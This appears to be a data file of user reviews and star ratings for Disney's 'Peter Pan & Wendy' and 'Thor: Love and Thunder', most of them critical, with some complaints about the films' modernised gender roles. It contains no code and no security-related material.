"The writers forgot what was the story of peter pan and wendy, what were the messages and the sense of the characters...this movie has no real message neither a story to tell, so i have nothing positive to say about it. People have long forgotten that, if you want to retell a story that has been already made, you have to adress the messages and value of that story and, if you think that those messages where ""bad"" or ""outdated"", you need to replace them with something of the same value and that, for sure, the original story won't be compatible for those new values...because the old story and characters where made for those old messages. Instead of trying to twist old movies to have 21th century values, which are not made for, Disney should stop playing so safe and start being creative and made new movies/cartoon for these new values.",0.5
"Looked terrible at moments, wendy is a flat character in this film and lets not talk about the powerpoint like transition. Just felt like a lazy kids film that kids enjoy who cant appreciate things yet or remember things",0.5
"It's nonsensical. Wendy was a motherly figure with feminine traits. Her relationship and influence to her siblings, Peter, and the lost boys was dependant on these personality traits. The lost boys were boys for a reason: girls knew better, they mature. It really makes no sense, how could they think anyone would like this nonsense? So bad.",0.5
The movie is pretty good. It has some references to the animated film and the source material and also a little bit of the play they did back in the day so I don't know why some people are complaining about a movie that's for kids...,5
"I was made to watch this for domestic peace. First and foremost it's boring. Secondly, the clear social messages contained in the original story, are completely missing. I'm not sure people involved in this ever read or watched previous versions or source material. Third, it has bad acting, poor CGI and is packed full of lazy modern tropes.",0.5
An unfortunate distortion of the original story.,0.5
"Absolutely loved this movie, the cast were amazing, Wendy was great and l loved Hook, Jude Law was fabulous but the star of the show was Peter Pan, such a talented actor and was cast perfectly for this role. Really fun, great for all kids and adults.",5
"I see what Disney's trying to accomplish and while their intentions are noble, the execution is just terrible. Wendy in this film can't hold a candle to her animated counter-part. In every dimension the animated Wendy was a far more intelligent, caring, creative character. Animated Wendy was a lovable character that embodied all the best characteristics of womanhood. This new Wendy is spoiled, entitled, rude, unappreciative, and just all around foul. And don't take my word for it Disney, my teen daughter hated this movie and couldn't believe how terrible it was. Some women dream of becoming great fighters, and that's wonderful and should be encouraged, but let's not pretend every woman dreams of this and let's not forget the dreams of 95% of our daughters to appease the 5%",0.5
"The original story was sweet and had important themes about growing up. But what remains after modern Disney has ""updated it for a modern audience"" is an absolute mess. It panders so hard that it eliminates anything compelling or remotely interesting in the story. Watch the old cartoon movie. Or read the wonderful original book. But don't give Disney your money to see this nor encourage them to continue producing their steadily declining quality of programming.",1
awful in every way. i wish i hadnt watched it. ruined the original,0.5
"The only WONDER in this once fanciful and swashbuckling story of innocence, the inedibility of aging, and a need for family is when you WONDER how in the hell could anyone call this movie Peter Pan.",0.5
horrible horrible. Disney plus subscription is getting harder and harder to justify.,0.5
"Half a star is me being generous - One of the worst adaptations of Peter Pan you could ever see. Absolute loss of your time, patience and energy and offers zero entertainment value.",0.5
"Terrible movie. Wendy is horrible Peter Pan is an @$$hole, no characters worth remembering. Disney needs to get back in touch with their roots. These new releases are awful.",0.5
"I feel sorry for the army of professionals who did their best on this movie, everyone from costumers to electricians to the practical and digital effects crews. It must be heartbreaking to see your work tied to every trite, politically correct mandate in the book.",0.5

"Why is the world of the mouse pushing so hard to destroy all that it was? This movie is just another example of Hollywood trying to rewrite what has been a great childhood story to fit their narrative. They could have branched off the peter pan story and made their narrative. Instead, they fail! The Lost boys were just lost boys! Not lost children. Turn it around get back track of family first programing or the house of mouse will be no more.",0.5
"Hooks entire motive in this film is to kill children. And yet when put next to Peter Pan and Wendy, he still looks like the good guy in comparison. This film sucked out the magic and wonder from the original story and just left me with a feeling of resentment",0.5
"This movie had awful reviews and as a result I didn't want to see it. However, I watched it and I didn't think it was too bad. It is a good film, not great or exceptional, but good. I like Disneys attenpt to make some of the key characters three dimensional, albeit not in exactly the way some may like. I think Tigarlilly is good in this version. Although there are some girl boss moments from Wendy I think she had earned these in the context of the film and I think Jude Law turns in a good performance as Hook.",3.5
I loved this film. Alexander is perfectly cast in the role of Peter. The film is charming and beautiful and entertaining. I love these latest remakes - they are fresh and move with the times as well as holding on to a much-loved story. PERFECTION!,5
"We all loved this movie. Great acting, fun, more current version was fab. My children wanted to watch it again, straight after it finished. Amazing all round! ***** I'm so confused how there are bad reviews on here, on this movie, did they even bother to watch more than a few minutes of it!? People complaining that it is so different to other versions...why on earth would we want it to be the same!? I certainly don't want newer versions of movies to come out and realise theyve are a carbon copy. Pretty boring... This was great!",5
"Awful movie, avoid it. It does not capture the essence of the original story as the classic Disney animated movie did. One of the greatest tales spoiled by another live-action poorly executed",0.5
Loved this movie. Kids loved it too. A little darker than the cartoon version and felt more current and modern. Cast was brilliant too,5
"Soulless and redundant, even more so than the other live remakes. There already is a live action remake (which is decent), and there's Hook (which was excellent). To go into a bit more detail: the settings are uninspired and bland, with muddy colours. There's little sense of adventure, nevermind fun. All three main characters, Peter, Wendy and Hook, lack what made them interesting. Also, I'm not against 'modernizing' stories, but the modern lecturing in this movie was plain cringy.",0.5
Every single message from the original story was lost in this adaptation.,0.5
"""Look how they massacred my boy"" The Godfather. A good description when corporations take a well established history and change the recipe.",1
"""Peter Pan & Wendy"" attempts to reimagine the timeless tale but falls short, delivering a disappointing departure from the beloved story. The inclusion of girls among the Lost Boys feels forced and disrupts the essence of the original narrative. Moreover, the transformation of Wendy from a loving and nurturing mother figure into a one-dimensional ""strong female"" character removes the qualities that made Wendy a cherished Darling. The film's attempt to modernize the story disregards the charm and heart that made the original resonate with audiences. ""Peter Pan & Wendy"" ultimately fails to capture the magic and spirit of the classic, leaving fans longing for the authenticity of the original tale. Alexander Molony's portrayal of Peter Pan in ""Peter Pan & Wendy"" disappoints, as his performance fails to capture the charisma and charm associated with the iconic character. Molony's portrayal lacks the necessary energy and depth, pushing him further into the background instead of being the captivating centerpiece of the story. The imbalance in focus is evident, with Wendy overshadowing Peter Pan in many scenes. The film's title itself, ""Wendy & Peter Pan,"" would have been more fitting, as Wendy's character force herself upon center stage while Peter Pan struggles to make a memorable impact. It's a missed opportunity to showcase the true magic and allure of the timeless character of Peter Pan.",0.5
"Una mala adaptacion, siguen contratando escritores que ni siquiera han leido el cuento original, estan mas preocupados por hacerla muy inclusiva; que no entendieron el mensaje. Peter Pan habla de una analogia, la ni√±as a diferencia de los ni√±os no quieren madurar, las ni√±as son demasiado inteligentes para caer en la tramp√° de la inmadures. Peter Pan es una historia sobre crecer, hacernos responsables, tanto en el libro como en la pelicula clasica nos recuerda que la inmadures es una trampa y que no debemos de caer. En el libro se explica porque no hay ni√±as, en el grupo de los ni√±os perdidos. Mejor le hubieran puesto Wendy, porque de Peter Pan no tiene nada. Disney no comprende los valores y el mensaje de esta historia.",0.5
This is really not peter pan. Buy a DVD of the old original cartoon before the erase it.,0.5

"This flop has none of the magic and whimsy that would delight little children, and none of the depth and compelling plotlines that would interest adults. Everything, from the CGI to the acting to the casting, is just bad.",0.5

"1.5 hours of lecturing. If you want a diverse, fun, light, enjoyable fantasy film with strong characters, I recommend the dungeons and dragons movie",1
"My childhood is ruined, and I am going to make sure my childhood are not ruined by this vain attempt to ""modernise"" it. Flat characters, distorted personalities, Wendy acts like a ""dick"", not seen to be mature, loving woman. And why completely emasculate Peter and Capt. Hook to weird male characters? Dont waste your time or your kids time on this nonsense.",0.5
"The movie looked good and the acting was decent. I understand that they wanted to give it a new twist, but like many of today's films, the original story is extremely different from this film's material hence taking away the values that the original story wanted to convey.",2.5
Another classic ruined. Where is the Peter Pan the we all know and love? He will be missed...,0.5
I had hopes for this movie but it just disappointed all around. I don't typically like to judge children actors/actresses but they were just bad. I got no charisma from Peter Pan and it was like they wanted to make Wendy a hated character. Its just bland all around and could have really benefited from a story rewrite and a little of the magic of the originals.,0.5
"Yet another movie where it is forced, and the writing was a badly executed college thesis on DEI, but with a crazy high budget. There wasn't anything about this that was celebrating the original universe, any better or even as good as, past efforts. Just another DEI forced package of nonsense, intended to scold ""cis-normative evil"" into ""doing better"".",0.5
"I grew up watching the original Peter Pan and loved it. The sword fighting, Peter and the Lost Boys saving the day, and Wendy being a strong maternal-like figure that painted womanhood in such a positive (and yes, empowering) light. Peter Pan and Wendy not only paints women in a very one-sided, shallow way, but also throws joyful boyhood out the window and tears masculinity in young boys down. As a mother of two, this is definitely a movie we will stay far away from. It's a sad day when I have to preview a children's movie before I let my children watch it.",0.5
"Could not even complete the movie, so many unneeded changes to a classic film. Peter Pan the hero has been reduced to a cowardly, fumbling idiot.",0.5

Turned it off before the halfway mark. Strays so far from the source good job once again Disney better luck next time,1
"Another girl boss movie. Remember when female characters were interesting and not just brilliant at everything? Love when Wendy thinks about her ideal life, which seems very much like the writer's one. My three sisters, my 4 aunts, and my wife all had successful careers. Yet, their children and (in some cases) grandchildren gave them the most pleasure. So it seemed strange she just wanted to travel and write?",0.5

Ruined the entire point of the original Peter Pan.,0.5
This movie is so bad my grandma hate it and she is dead! watching one of Disney's iconic character in history like Peter Pan an i felt sleep watching this movie that's how bad it is.,1
"Disney has taken these wonderfully crafted masterpieces and turned them into dark, depressing, ambiguous, garbage. This goes way beyond race-swapping and gender-swapping. It attacks the very heart of the source material and the previous incarnations. In order to turn Wendy into Peter Pan, you remove all the nuance and interesting quirks of the characters. You lose sight of the overall message of the story. You muddle everything up until it is as absolutely drab as the cinematography. The entire idea of Peter Pan was already, by itself, a feminist message. Only boys were foolish enough to go to Neverland and hide from growing up. It took the girls (Wendy, and eventually Tinkerbell after overcoming some jealousy - another nuance dropped in this version) to keep them focused and lead them home. Peter was always the hero, but a flawed one who would rather go on another dangerous adventure than face reality and growing up. Wendy was not a girl boss - even though she definitely stood up for herself - she was much less physical and much more cerebral. In this version, she's basically Peter Pan. A dreamer, not wanting to grow up, wanting to fight, etc. That's not Wendy. And by making Wendy Peter, you neutered Peter. And by making Hook a former best friend, you ruined Hook. Anyway, this is too many words and too much time wasted on this rubbish. Read the book. Watch 'Hook'. Watch the o.g. Disney animation. Do any of that before wasting your time on this.",1
"En este pel√≠cula se perdi√≥ la verdadera esencia, que le caracteriza a Piter pan y m√°s a√∫n del cl√°sico animado del 53.",0.5
This movie has no respect for its source material and especially for mothers out there. This movie felt like it was made by high schoolers who were given the task of making a movie with a billion dollars. No charm whatsoever,0.5
"Let's change the title to ""Wendy, powerful girls that need no saving, and other useless characters: someone may be Peter Pan but it doesn't matter."" With this title i could give even a full star review... awful special effects, dark images, plain characters, inconsistent story. Need something else? The saddest part is that i can't give a rating less than half star.",0.5
"To preface this, I'm not at all one of those people who hates Disney for political reasons. I enjoy a lot of their product but... not this. I appreciate that they at least tried to do something different here but the whole attempt feels disingenuous. Wendy, essentially being Peter, and Peter being Wendy kind of ruins the entire point of the story. It seems that all the Lost Boys weren't putting up with Peters nonsense the literal moment Wendy showed up, so why did they even follow him as a leader in the first place? As others have pointed out, the only good element here is Law's Hook, but that should be expected considering he's an established actor. I appreciate the attempt at the origin story between Peter and Hook and that alone could have made the movie very interesting. Unfortunately, that story just never progresses past a surface level. Basically, no character was true to form which is what made the whole movie fall apart for me. I didn't feel like I was watching an iteration of Peter Pan. Instead, I felt like I was watching a Disney channel show looking to tic the boxes.",1
Asquerosa.... Me estaba durmiendo a 30 min de que empez√≥,0.5
"Looks like someone didn't read the book or any other source material. Wendy is a smart mature fun and motherly character while Peter is also fun, but has a less mature aggressive side and Wendy can counter his impulsivity with reason. These versions of the characters were people I didn't recognize. Tinker bell wasn't jealous of Wendy when that was the core of their conflict. Hook's new backstory was very bizarre and while I see how they were trying to be inventive, it's not at all what J.M. Barrie's Hook is. All the original conflicts were erased and replaced. Someone borrowed the world and the costumes and placed random characters in it.",1
"MEH falls really flat Visually looked good and acting was ""good"" but like they played it safe and tried to make everyone happy meaning really no one is.",2
Yeah no thanks. We will stick to the classics. Keep destroying the company Disney. Nothing you've done has been approved by our 8 & 10 year old girl who loved Disney's classics.,0.5
Great cast especially Hook. Great visuals but the story strays too far from The source material. A swing and a miss unfortunately.,1
"What is this? This is nothing at all like the story. Even my daughter decided to watch Power Puff Girls after 30 minutes. Peter Pan is a wimp. Wendy is the main character. The BS Capt Hook story of him being BFFs with Pan. Tink is still cute, but why isn't she fiesty or protective of Pan? Maybe cuz he's too much of a wimp? I don't know. Too many changes for it's own good. Disney! I'm trying to be supportive, but you're imploding on your own devices.",0.5
"All the original important themes have been removed and swapped out for 2023 storylines. Feeling very gaslit. Everything here is the opposite of what the original story was about and is not worth watching. Wish I had that ""lost"" time back. Grappling with the idea of discontinuing my money exchange with disney even though there are some great shows I really like. :(",0.5
"They took a vague mist of the movies premise, then completely rewrote the entire thing. What was once a children's classic is now yet another Disney flop. They strayed from the proven formula of make movies for children with children issues and thoughts and likes and politicized it.

Therefore, they should carry on making these movie as they are great becoming a hateful material to many and saves me more tickets to cinema.",0.5
Those people running Disney must hate Walt Disney and everything he and his company stood for. The originals are beloved all over the world. But they want to replace them with awfull movies that destroy the originals. Cultural vandalism at it's worst.,1
Please can we stop with these god awful remakes. Disney must be aware of how badly thier brand is being eroded by this utter incompetence.... Obviously not as The little mermaid is just around the corner... Sigh.,0.5
Awful movie that doesn't resemble the Peter Pan the we all grew up with.,0.5
"The movie has nothing to do with the magic of the original film. From beginning to end, it's very dark, the acting performance was more than mediocre, and the story was simply poorly altered.

Zero stars? The lost boys girls and they thems...really?,0.5
Disney have raped yet another of their animated properties to death. This is a company that is incapable of learning by their mistakes. My only hope is that they lose so much money they will be forced to sell Lucasfilm and Marvel to survive. This would be good for both Lucasfilm and Marvel. As for Disney? Who even cares.,0.5
Horrible. The worst peter pan movie.,1

"Wow. I wasn't expecting much from this one given recent history, but I thought things wouldn't be getting worse. I was wrong. I get that there is a glut of scripts from the pandemic to work through, but you may want to skip ahead, because this twisting of everything from the original to be ""girl power"" ""subverting of expectations"" ""I don't need no man"" isn't simply old, it's bad. If you're at a a fan of the original animated classic, don't damage yourself by watching this. Watch Robin Williams in ""Hook"" instead.",0.5
Zero magic in this reimagining. I reckon Peter Pan and Wendy will appear dated in the future. Much in the same way those crappy 1990's Batman movies are. Everything is forced through the lens of 2023 and is devoid of timelessness and heart. Skip it!,0.5
"I'm not sure who is rating this movie so poorly! I have seen ""16%"" level movies before. They are truly awful. This one, however, was engaging and meaningful. I turned the movie on for my kids but watched the entire thing with them! My 11, 9, and 6-year-old children were invested and entertained. The acting was great and the movie managed to take an old storyline from a cartoon and turn it into something that felt new and fresh. I was happy to see strong female characters that didn't leave the bravery to the boys. Why would anybody rate this less than four stars? I can't imagine they actually watched the movie.",4.5

"Just garbage. It feels like whoever wrote this movie didn't actually understand the message and values of the original at all. Sure, I can understand getting rid of ""the red man"" song and choices like that. But they went too far to the opposite way. Neverland was meant to be a place filled with a boy's fantasy (pirates, Indians, etc.) and no girls. But it ultimately proves how important girls and grownups are and how the ""never grow up"" idea has its flaws. This one spits in the face of all of that. I wish Disney wouldn't have 2023-ified this at the expense of the actual value of the old one.",0.5
"A terrible adaptation, the characters were weak and the movie has zero depth.",0.5

Disney really needs to stop killing its own legacy.,0.5
"This was just another feeble attempt by a movie studio that lacks original content or ideas. When a movie studio continues to remake original classics and purposely refuses to use the original source material in favor of pushing a flawed narrative, the result is a movie that fails to entertain with flat characters. It's no wonder that the director doesn't care what people think. The movie clearly show the directors lack of commitment to the original story line and that they only cared to push a narrative and cash a paycheck. Disney really needs to stop hiring directors and writers that don't care about quality while they attack capitalism while cashing these checks. Writers, producers and directors should be paid on a percentage scale based on actual profit instead of the way they are being paid now and maybe we as customers can get better shows and movies. It really feels that Disney wants Disney+ to fail by the movies and shows they keep putting out. This movie wasted my time and basically tried to kill this franchise.",0.5

"I have no idea why the rating is so high, this movie was like a fever dream. Thor, a character with one of the most tragic backstories in the entire MCU, becomes a laughingstock.

"This film was so incredibly tedious , I just switched off, it was too silly, just a constant barrage of cringey joke after joke, it was overkill. It felt more like a parody of a marvel film rather than a real story with heart or the next chapter of Thor's story. There also wasn't any real character development or much depth to the film. All in all it was just mindless silly humour that's tiresome. Needs a change of direction & director",1.5
Es una gran pel√≠cula para Thor,5
"Taikai Waititi brings a spin to the Thor franchise with a new fast-paced movie that has oodles of silliness, but more often than not, this silliness doesn't find a way to translate into laughs- and you know you have a serious problem when the emotional parts end up being more silly than the actual silliness. Overall: 4/10",2
All people hates this movie for the last scene but a true Marvel fan will understand the situation .,5
"Nao tem nada neste filme que se salva, comedia exagerada.",1
This movie completely ruins Thor's character. The movie is trivial and itself seems like a narcissistic endeavor for the director--- he doesn't really care whether the the movie is enjoyable. There is a bit of fun with humor but there is too much of it and it too often trivializes would should be held sacred. The movie is what it wanted to be-- a big joke.,1.5

Not a terrible movie however it was completely unnecessary. The inclusion of Gorr the God Butcher was okay. Brining back Natalie Portman didn't really serve any kind of purpose. Still entertaining.,3
These kinds of movies make me dislike superhero films.,0.5

"""Love and Thunder"" Review: Lightning Doesn't Strike Twice The Marvel Cinematic Universe returns with ""Love and Thunder"", and while it dazzles with its usual flair for visual spectacle, it feels as though the franchise has taken two massive steps backwards. For those who live for the electrifying action sequences and high-end visual effects, ""Love and Thunder"" delivers. The MCU seldom disappoints on that front. But for those yearning for the compelling story arcs and consistent pacing that anchored its predecessors, this installment might leave you wanting. Christian Bale, known for bringing depth and gravitas to his roles, once again proves why he's among the elite in Hollywood. However, even his stellar performance couldn't breathe life into a character that feels disappointingly underdeveloped. It's a testament to Bale's prowess that he shines despite this, but one wishes he had been given more to work with. Where ""Ragnarok"", directed by the same Taika Waititi, struck a delicate balance of humor, action, and emotion, ""Love and Thunder"" seems to lose its way. Waititi, in trying to amplify the humor quotient, overreaches. The subtlety and fresh comedic elements we loved in ""Ragnarok"" seem replaced by louder and more repetitive beats in this outing. In conclusion, while ""Love and Thunder"" parades its visual might and benefits from Bale's masterful acting, it lacks the nuanced blend of storytelling and humor that made ""Ragnarok"" a standout. For MCU enthusiasts, this might be a visual treat, but for those seeking the narrative depth and tonal balance of its predecessor, it may feel like a jarring misstep rather than a progressive leap forward.",1.5
Absolutely wasted the character of Gorr the God Butcher AND Christian Bale.,0.5
"I am a HARD CORE Marvel fan, but this movie is ridiculous! It seems like one big joke, and the whole movie could be in the extras as bloopers and gags. I did like the end of the movie however as it was the only part that didn't feel like a bad joke. The Thor play done by actors (Matt Damon etc) was a good part, and more entertaining than the movie.",2.5

"This movie was way too goofy for my liking. For a movie with Gorr the God Butcher, there wasn't enough god butchering shown on screen. He wasn't really shown as a threat at all. And Thor's character progression since the end of Infinity War has been awful. He's just a joke of a character now. This movie needed to be dark and serious and Taika Waititi made it a goofy and jokey children's movie. Massively disappointed.",2.5
Very good I dont know why this movie gets hate,5
Mostly dumb. It doesn't seem to add much in terms of Marvel Lore. I felt nothing for the characters even though I have been a fan if Thor since the get go. And they missed a huge opportunity of having an epic battle scene with all the universes gods. Overall it was amusing in some parts but actually it was just very forced and boring.,2
"It was great, but definitely lacked depth. There was no connection to the characters to feel emotional about anything. Felt a bit like a parody.",3
Simply a much worse version of Ragnarok.,2
"Eu s√≥ posso dizer que √© triste... Triste o mais forte dos her√≥is ser transformado em um idiota abobalhado e que em nada se parece com os quadrinhos, s√≥ tem o nome. √â um filme ruim em qualidade gr√°fica, dire√ß√£o muito ruim, roteiro muito fraco, aproveitamento p√©ssimo de um vil√£o que poderia ser incr√≠vel. N√£o tem nada bom, de verdade. Eu gosto de Thor, mas esse filme √© horr√≠vel.",0.5
"I liked it generally, too much cheese and unseriousness but I liked it.",3.5
"Sucked, Disney needs to be outlawed.",0.5
so funny and silly and adventurous went so places so crazy and yes i am zeus,5
"It tried and failed to replicate ragurock, worth watching if you have nothing better to watch",2.5
"This movie gets a touch over-hated on the social medias. While it is nowhere close to how good Thor: Ragnarok is, it is also still not close to being the worst Thor movie. Some of the jokes were childish and overused (Looking specifically at the Goat. The screaming was funny the first and second time, and definitely not, by the seemingly 70th, and 71st time they did it in the movie). While I loved the humor on Ragnarok, it was way over the top in this movie, especially for a movie with a story line about finding out someone has cancer, and a villain who is murdering Gods. Christian Bales performance, albeit rare, was really well done, and they should not have cut as many Gorr scenes as they did, to be a full-fledged comedy. Some of the scenes were heartfelt, however, and the end-credits were well done. Overall, gave it a 71.9/100. Go see for yourself!",3.5
"So sorry to have to say this but its probably the worst marvel movie, they have made the thor character out to be a bumbling fool that lumbers from one stupid mistake to the next, I can see what they where trying to achieve but they had been given to much budget and free rain for this movie, I hope we see thor again but I also hope we see a more intelligent movie for him next time.",1
"This is the definition of a rollacoaster, you get to the cinema, laugh yourself out and you're done. The Jane plot and main villain are so cool yet it's over shadowed by the whole lol funny quip of the movie.",2.5
Good movie. Very entertaining. Only thing I didn't liked was Gorr didn't get proper screen time.,5
Another Incredible comedy movie for Thor! Loved seeing Olympus in the MCU! Very enjoyable! A must watch!,4.5
It was not as good as the other Thor movie. Gorr had wasted potential and the inclusion of Jane Foster was bad. It did improve after the fight with Zeus but the main problem with the movie is that they try too hard to be like the previous one. Thor Ragnarok was good because the jokes were funny and the movie was serious when it had to be. This movie doesn't take a literal being slaughtering gods seriously at all but instead makes unfunny jokes instead of showing Gorr doing what he is known for. Talented actors like Christian Bale don't come around very often to play interesting characters like Gorr. Bale even said he would never play a comic book character again after the Dark Knight Rises but he came back to play this Gorr and instead of making him interesting they just wasted him. I understand that they can't make the Necrosword a symbiote like it is in the comics but they should have at least tried harder than that.,3
"Ragnarok redux, but not as bad as they say. Christian Bale does enough.",4
This movie was so bad. It made little to no sense. The entire thing felt like a mental collapse into schizophrenia. Enough girl bossing to cover a feminist wet dream and then some. All bandaged together by flashy CGI and brain dead 12yo humor. Just another money grab for Disney with a complete lack of substance that the countless brain sponges love to consume like cattle.,1
"Probably the weakest of the Marvel movies. Still funny and good; however, the director should have used the villain more. Generally weak writing.",3
"I don't understand the bad reviews. Watching this film was just plain fun. I laughed, I cried, I enjoyed it all the way through. There's really nothing else I wanted out of this movie. It's not crazy deep, not thick with lore or anything. It's just‚Ä¶ good. 11/10",5
"If you thought marvel had done ""Big and Dumb"" bigger and dumber than anything else, just wait until you see Marvel doing big and dumb with a soundtrack containing FOUR Guns n' Roses songs! Genuinely fun, not actually very good",3
"After delaying it for a while, I finally watched it, and sadly, it's the WORST Marvel movie to date! It's the first time, I had to force myself to watch a Marvel movie to the end. They tried too hard to be funny, but the humor was just average, and the attempt to add depth to the story felt forced and cheesy. The way they tried to develop the characters was anything but subtle. The movie lacked any real suspense, or substabce and the fight scenes were silly. I could list more issues, but I've already wasted too much time on this pathetic disaster. One good point was how they addressed cancer in the script. But overall, I'm glad I didn't pay to see this disappointing movie in a theater. Marvel, please don't make another one like this!",0.5
one of the worst movies i have seen in my life.,0.5
"i had a hard time finishing this movie because of all the unnecessary jokes during serious moments, idk how taika waititi thought this was a great idea and idk what the writers were thinking by implementing that many jokes in this movie. towards the end some aspects were weird but i enjoyed it, the final scenes of jane foster and thor were emotional, visually stunning its just unfortunate it was unbearable due to jokes, gorr wasnt utilize much at all although he gave me a sense of fear and hopelessness he did not deliver but christian bale's performance was amazing its just sad the character wasnt utilize to the fullest, and after ragnarok thor was mighty and he felt godly but in this movie he just felt less of a god and more of a comedian.",2.5
"My guess is that the extended cut/director‚Äôs cut is way better. Gorr (Bale) needed more screen time. Way too goofy of a plot and ending, the film felt completely unserious by the end.",2
"The costumes look like they were all ordered off Amazon last minute. There was a poor balance of comedic and serious moments. Who was the target audience? The movie seemed like it was geared towards a family/young audience but was far too inappropriate. Thor randomly being naked in front of Zeus was obviously for adult fans and the god killer was way too dark for a child audience. It was odd they decided to make cancer stronger than all the gods. If the hammer came back together to protect Jane it didn't make sense to have it sap her power every time she used it. It didn't make sense to have ""the god killers"" daughter come back to life on earth and suddenly have superpowers. I appreciate that Disney was attempting to be creative but they went in so many different directions with this film that didn't make sense or follow logic of previous Thor movies.",1.5
Worst marvel movie by far. I don't know how they went from thor ragnarok my favorite marvel movie and with mostly the same cast and the same director and absolute ruin everything that made Ragnarok great.,1.5
What a disappointment of a movie! So much potential with the cast and the last movie being so good. The film doesn't take itself seriously at all. Some characters that die just seem to randomly come back to life.,2
The movie was excactly my humor but it suffers from being cut down to much. Chrstian bale is a great gore but he has not enough screentime to fully show this characters potential. The whole story line should have been very dark but the mix between comedy and dark movie just didnt work. Taika waititi had ful control of the movie and may have had to much overconfidence in his comedical talent. It definitely is a must watch but dont expect too much,3
"Cringe, ruining the character arcs with a joke at every turn, Ragnerok had a brilliant ability for one scene to be full of jokes and the next fairly serious, this was just abysmal, real shame for what was one of marvels last great superhero's Lady sif would've been a better story arc than following Natalie Portman down that rabbit hole again,",1.5
Worst one of all the Thor movies.,3
"This movie was such a disappointment man... I had some high hopes after Thor 3, which was great, but this was just bad. Gorr was great but everything else about this movie just did not work for me.",2
"With strong performances from Hemsworth and Bale, Thor: Love and Thunder unfortunately leans heavily into the exaggerated humour and style established in Ragnarok, at times bordering on parody.",3.5
I thought it was pretty funny and sometimes it just wasn't at all great just horrible humor and characters gorr carried tho,2.5
"Cliche, sometimes dull but generally entertaining. It is better to see this movie for its jokes rather than the story it tries to exhibit.",3.5
This was the biggest disappointment in marvel history,1.5
Thor was good movie little bad the movie needing more actions the funny part was Thor and Peter the funny part,4
"It had a lot of fun parts but they robbed Thor of his masculinity, made him seem weak and made him a single dad. Not my idea of a great super hero movie.",2
It had funny parts Christian bale was great like always,3
"I don't even know what to say‚Ä¶ This was one of the worst MCU movies ever and do not let anyone try to fool you or tell you otherwise. From the forced unfunny humor every second, to the awful dialogue, and lack of a seriousness or any true feelings, this movie definitely derailed the MCU and confirmed the projected path of trouble the whole Marvel Universe has been in after the dramatic conclusion of Endgame. Completely missed the mark, wasting Christian Bale and the fascinating threat Gorr could have been. And lastly, made Thor and his whole persona into a complete idiot that is only there for comic relief. I do not hate comedy and the humor in the MCU when it is done subtly and correctly like the Guardians of the Galaxy franchise. But not when it completely misses the mark and over saturates the product to the point that the most powerful hero in the MCU who has been through trials and tribulations is turned into this. What a slap to the face of Chris Hemsworth, who is suffering and one of the main advocates for changes to be made expeditiously. The MCU movies and the fragile future of this universe needs drastic changes that I do not see Disney doing or even caring to consider.",0.5
"I loved the first ""Thor"" movie and have seen a handful of Marvel movies. I enjoy the characters and love Natalie Portman. But I really feel like these actors were wasted on a horrible plot line and too many dumb action tropes. The plot had so many holes I could have strained my spaghetti. I was okay with it until the ending, which was so poorly done. Why was Thor's hammer ""using"" Jane? Has Thor always had the power to give others his power temporarily as he did with the kids? Why on earth does an Infinity Source ""God"" need a recently made weapon as a ""key"" to unlock it and why on earth give a single wish to the ""first"" there? And this ""heartfelt"" conversation in the end where our bad guy selfishly uses his single wish to bring his daughter back (not wishing Jane to be well), leaving a kid I don't care about with Thor? Is this supposed to be meaningful and heartwarming?",2
"The last Thor movie was delightful, funny and really great to watch. This movie, that I watched at the movie, made me feel angry, offended and treated as a child with low IQ. The humour was aweful, the script was terrible. Every single scene was worst then the previous one. Only one good part can be considered about the role of Christian Bale, that for me he was completely wasted in this movie. A real disaster. I literally threw away my monet to see this rubbish.",1
"CGI desgra√ßado, roteiro sem p√© nem cabe√ßa, fan service desnecess√°rio (s√≥ para aumentar o ""hype"" do filme), atua√ß√µes medianas",2
Que triste que transformaram um dos her√≥is mais bad ass da Marvel em um cara piadista e fraco muitas vezes.,2
"This movie is not good. The jokes are not funny and they were too plentiful. The characters are annoying and were a lot better in Thor Ragnarok. This movie also manages to pull off the major crime of wasting Christian Bale, who by the way, is the best part of this whole mess of a film. His performance is scary and sympathetic, but he's barely in the film, and the more serious sides of the story were drowned out in favor of the next lame and unfunny joke. This movie was not good at all and phase 4 truly deserves the name phase bore. No Way Home and Moon Knight were really good though.",1
It tries too hard to recreate the comedy of the last Thor movie but it barely makes me laugh. The Villian though Christian Bale gives a great performance is poorly written as he seeks revenge on all gods because they didn't help him in his daughter but yet kidnaps kids in order to bring Thor to him I just feel it could have been written better. Also the weird jealousy romance with Stormbreaker and a Mjolner is very cringe. Its whole premise is a comedy that doesn't make me laugh but about two times.,2
"Honestly this movie was a waste of my time. It was too silly, and the humor was juvenile. I couldn't take the plot seriously and they wasted Christian Bale. I was relieved when the credits rolled",0.5
I didn‚Äôt like this. Visually cool tho.,2.5
"I loved this movie. It was a very fun film. Chris Hemsworth, Christian Bale, Natalie Portman, and Russel Crowe were all fantastic, and the script was one of the best I've ever seen",5
Excessively stupid. The icing on the cake of the biggest screwup in Hollywood history that is the MCU phase 4,0.5
"Pretty fun, had some faults but good",3.5
"How does this movie have such a high score? Terrible forced humor undermines any real sense of drama. ‚ÄúThor, Ragnarok‚Äù had the balance of humor and drama done right. This one just felt insulting to the integrity of the characters.",2.5
"My god was this movie bad. In an attempt to recreate the outstanding movie named Thor: Ragnarok, Marvel Studios produced one of the worst movies I have seen in a while.",2
A Great villain wasted.,1.5
Looked great with the retro style and had some decent comedy,3.5
"The biggest letdown MCU has pushed out. Too much comedy, no emotion, Bale is the only person who showed up to make a movie. Terrible was to portray Thor, especially if this was his last Chris Hemsworth appearance.",1
I was super excited when it was coming out because I loved Thor Ragnarok and this was made by the same director. Unfortunately this one is no where near as good. It undercuts every important part with jokes and somehow this is some of the worst CGI in marvel.,1.5
"Not as bad as everyone makes it out to be, but not great either. It seems the MCU thought that the silly comedy of Ragnarok was the only thing that made it good, so they doubled down here.",3
"How I rate movies 1. Not annoying 2. Consistent characters 3. A well thought out plot and well concluded ending 4. Does it inspire me 5. I will watch this literally over and over again on a loop 1. The 80s was a lot 2. Why did they all suddenly decide that Thor wanted children? Ah, for the sake of their arbitrary plot 3. Picking the non obvious ending doesn't make you a good writer, it means the ending was all set up and it was broken, and not in a wow cool mind-blowing way. Were it set up well it would be beautiful and heart touching, as it is I feel nothing for this child, other than confusion as to how the ending is supposed to be happy. 4. Meh 5. Nope",0.5
Just don't bother. I wish the best for Chris Hemsworth as he's a fantastic actor who deserves better then how his Thor has been portrayed.,0.5
